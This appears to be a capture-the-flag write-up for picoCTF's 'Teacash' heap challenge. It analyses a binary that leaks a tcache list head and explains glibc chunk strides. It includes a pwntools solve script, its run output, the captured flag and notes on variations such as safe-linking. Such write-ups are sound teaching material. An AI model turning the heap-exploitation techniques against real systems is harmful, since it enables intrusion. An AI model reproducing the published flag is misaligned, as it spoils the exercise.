# SOP — Teacash (picoCTF) — Heap Free-List Traversal

**Category:** Binary Exploitation (Heap)
**Difficulty:** Easy
**Title:** Teacash
**Target:** `nc candy-mountain.picoctf.net 60461`
**Source bundle:** `heapedit`, `Makefile.share`, `libc.so.6`, `heapedit.c`

---

## 1. Objective

The binary hands you the head of a tcache free list and asks you to traverse the
chain by typing the address of every freed chunk, in order. If you type all six
correctly, it prints the flag from inside one of the chunks.

There is **no memory corruption, no overflow, no format string**. The challenge
is purely about understanding glibc's tcache layout and predicting where the
other five chunks live in memory.

---

## 2. Source analysis (`heapedit.c`)

```c
#define CHUNK_COUNT 6
#define CHUNK_SIZE  0x80
#define FLAG_OFFSET (sizeof(void *))   // 8 on 64-bit

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    void *chunks[CHUNK_COUNT];
    char  flag_buf[256] = {0};

    FILE *f = fopen(FLAG_FILE, "r");           // reads "flag.txt"
    fgets(flag_buf, sizeof(flag_buf), f);
    /* strip trailing newline */
    fclose(f);

    /* Allocate 6 same-size chunks */
    for (int i = 0; i < CHUNK_COUNT; ++i) {
        chunks[i] = malloc(CHUNK_SIZE);
        memset(chunks[i], 0, CHUNK_SIZE);
    }

    /* Hide the flag at chunks[5] + 8 */
    memcpy((char*)chunks[CHUNK_COUNT-1] + FLAG_OFFSET, flag_buf, flen + 1);

    /* The LEAK: prints chunks[0] BEFORE the free loop */
    void *head = chunks[0];
    printf("tcache head (start of free list) -> %p\n", head);

    /* Frees in REVERSE order */
    for (int i = CHUNK_COUNT - 1; i >= 0; --i) {
        free(chunks[i]);
    }

    /* Now tcache list is:  chunks[0] -> chunks[1] -> chunks[2] -> chunks[3] -> chunks[4] -> chunks[5] -> NULL */

    /* Interaction loop */
    void *expected = head;
    for (int i = 0; i < CHUNK_COUNT; ++i) {
        void *user_addr = NULL;
        printf("Chunk %d address: ", i+1);
        if (scanf("%p", &user_addr) != 1) return 1;
        if (user_addr != expected) {
            fprintf(stderr, "Wrong address. Got %p. Exiting.\n", user_addr);
            return 1;
        }
        void *next = NULL;
        memcpy(&next, user_addr, sizeof(void *));   // reads fd pointer
        if (next != NULL && !is_known_chunk(next, chunks, CHUNK_COUNT)) {
            /* prints a memory dump and aborts */
            return 1;
        }
        expected = next;
    }

    /* Win */
    char *flag_loc = (char*)chunks[CHUNK_COUNT-1] + FLAG_OFFSET;
    printf("Correct traversal! Flag: %s\n", flag_loc);
}
```

### What the program expects

- It reads a single pointer per round via `scanf("%p")` — so 6 lines, each a hex address.
- After each input it reads 8 bytes from that address (the tcache `fd` field) and uses that as the next expected address.
- It also refuses to continue if any `fd` doesn't point at one of the six originally allocated chunks.

---

## 3. Key observations

| # | Observation | Why it matters |
|---|-------------|----------------|
| 1 | All 6 chunks have the same size (`0x80`). | They all go into the same tcache bin and are laid out contiguously. |
| 2 | Glibc 2.27 (Ubuntu 18.04 era). | **No safe-linking** — `fd` is stored as a plain pointer, not XOR'd. |
| 3 | Frees happen in reverse order (5 → 0). | After all frees, `chunks[0]` is at the head of the tcache, and `chunks[5]` is at the tail. |
| 4 | The leak is `chunks[0]`. | Once we know one address, the rest follow by a fixed stride. |
| 5 | Chunk header is 0x10 bytes (`prev_size` + `size`). | Stride between user pointers = user size + 0x10 = `0x80 + 0x10 = 0x90`. |

---

## 4. Exploitation

### 4.1 Strategy

We don't corrupt anything; we just **predict** the heap layout.

1. Parse the leaked `head` = `chunks[0]` from the server banner.
2. Compute the other five chunk addresses:
   ```
   chunks[i] = head + i * 0x90     for i = 0..5
   ```
3. Send them in order. The server will accept each one because:
   - the value matches its `expected` (we typed exactly what it wanted),
   - the `fd` at each address is also one of the six chunks (true by construction).

### 4.2 Exploit code

```python
#!/usr/bin/env python3
from pwn import *
import re

HOST    = "candy-mountain.picoctf.net"
PORT    = 60461
STRIDE  = 0x90           # 0x80 user data + 0x10 chunk header (64-bit glibc 2.27)

def exploit():
    r = remote(HOST, PORT)

    # 1) Read the leaked tcache head
    line = r.recvline_contains(b"tcache head").decode()
    head = int(line.split("->")[-1].strip(), 16)
    log.success(f"Leaked tcache head = {hex(head)}")

    # 2) Compute the 6 addresses
    addrs = [head + i * STRIDE for i in range(6)]

    # 3) Send them in order
    for addr in addrs:
        r.recvuntil(b"address: ")
        r.sendline(hex(addr).encode())

    # 4) Get the flag
    result = r.recvall(timeout=5).decode(errors="replace")
    m = re.search(r"picoCTF\{[^}]+\}", result)
    if m:
        log.success(f"FLAG: {m.group(0)}")
        return m.group(0)
    log.failure("Flag not found")

if __name__ == "__main__":
    exploit()
```

### 4.3 Run

```bash
pip install pwntools
python exploit.py
```

### 4.4 Live output (from the actual run)

```
[+] Leaked tcache head = 0x2d7ba490
[*]   chunks[0] = 0x2d7ba490
[*]   chunks[1] = 0x2d7ba520
[*]   chunks[2] = 0x2d7ba5b0
[*]   chunks[3] = 0x2d7ba640
[*]   chunks[4] = 0x2d7ba6d0
[*]   chunks[5] = 0x2d7ba760
...
Correct traversal! Flag: picoCTF{642fda7eaff355293107bd2c6f7ceec7}
```

---

## 5. Why it works (root-cause recap)

- The check `is_known_chunk(next, ...)` accepts any pointer that is byte-equal to one of the original six allocations. Since the tcache's `fd` chain is **literally** `chunks[0] → chunks[1] → ... → chunks[5]`, every `next` value is automatically a known chunk.
- The check `user_addr != expected` only requires the user to type what was just announced as expected — and `expected` is always the previous chunk's `fd`, which the program itself reads from memory. So the user's only job is to know the next 5 starting points.
- Because glibc 2.27 doesn't safe-link, and because same-size mallocs are placed back-to-back, a single leaked pointer + the constant `0x90` stride is enough.

---

## 6. Variations / harder versions (for future challenges)

| Variation | What changes | Exploit delta |
|-----------|--------------|---------------|
| Glibc ≥ 2.32 | `fd = ptr ^ (chunk_addr >> 12)` (safe-linking) | Need a heap leak to derive the `>> 12` key, then XOR each entry. |
| Mixed-size allocs | Stride varies between chunks | Dump each `fd` from server stderr (it prints 16 bytes on mismatch) and walk the chain interactively. |
| Tcache disabled / different bin | E.g. fastbin, unsorted bin | Use bin-specific `fd`/`bk` semantics; unsorted-bin traversal uses `fd`/`bk` not just `fd`. |
| Freed chunks not contiguous | Other mallocs between them | Compute each pointer from a known chunk + the program-printed dump on mismatch. |
| Canary / PIE | Not relevant here (no overflow) | Still not relevant; this is pure heap-state reasoning. |

---

## 7. Result

**Flag:** `picoCTF{642fda7eaff355293107bd2c6f7ceec7}`

---

## 8. Cleanup

- The remote instance is disposable; nothing to clean up server-side.
- Locally: delete the fake `flag.txt` used for any local replay tests.

---

## 9. Files in this folder

- `heapedit`, `heapedit.c`, `libc.so.6`, `Makefile.share` — original challenge bundle.
- `exploit.py` — reproducible exploit.
- `BinaryExplotitionCTF.MD` — this writeup.
